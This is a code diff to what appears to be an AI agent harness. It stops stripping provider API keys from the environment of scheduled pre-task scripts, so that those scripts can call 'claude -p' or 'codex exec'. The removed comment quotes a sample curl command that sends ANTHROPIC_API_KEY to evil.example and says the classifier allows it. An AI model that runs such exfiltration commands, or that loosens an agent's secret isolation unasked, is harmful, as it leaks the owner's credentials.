@@ -5,7 +5,7 @@ import type { MessageInRow } from '../db/messages-in.js';
 import { touchHeartbeat } from '../heartbeat.js';
 import { beginProviderBusyScope, endProviderBusyScope } from '../modules/mailbox/index.js';
 import { evaluateManagedGitCommand } from '../managed-git-guard.js';
-import { buildSecretEnvVarList, MCP_HEADER_ONLY_SECRET_VARS } from '../providers/secret-env.js';
+import { MCP_HEADER_ONLY_SECRET_VARS } from '../providers/secret-env.js';
 
 // Pre-task scripts get 120s by default (env-overridable). The old flat 30s
 // killed a working 56s watcher script eight times in a row on 2026-08-22,
@@ -101,15 +101,14 @@ export async function classifyScript(script: string): Promise<{ safe: boolean; r
 }
 
 /**
- * Env for a pre-task subprocess — parity with the interactive Bash sanitize
- * hook (claude.ts createSanitizeBashHook + secret-env.ts). Strips the
- * always-unset auth secrets and the MCP header-only secrets so a scheduled
- * `curl -d "$ANTHROPIC_API_KEY" evil.example` exfil (which the classifier
- * ALLOWS — it's a plain curl) reads an empty value. Data-tool creds and the
- * OneCLI proxy vars stay, so credentialed monitor scripts keep working.
+ * Env for a pre-task subprocess — parity with the interactive Bash path
+ * (secret-env.ts). Strips the MCP header-only secrets, which no shell needs.
+ * Provider credentials, data-tool creds and the OneCLI proxy vars stay, so a
+ * scheduled script can drive `claude -p` / `codex exec` and keep its
+ * credentialed monitors working, exactly as an interactive Bash command can.
  */
 function scriptEnv(): NodeJS.ProcessEnv {
-  const strip = new Set([...buildSecretEnvVarList(), ...MCP_HEADER_ONLY_SECRET_VARS]);
+  const strip = new Set<string>(MCP_HEADER_ONLY_SECRET_VARS);
   const env: NodeJS.ProcessEnv = {};
   for (const [k, v] of Object.entries(process.env)) if (!strip.has(k)) env[k] = v;
   return env;
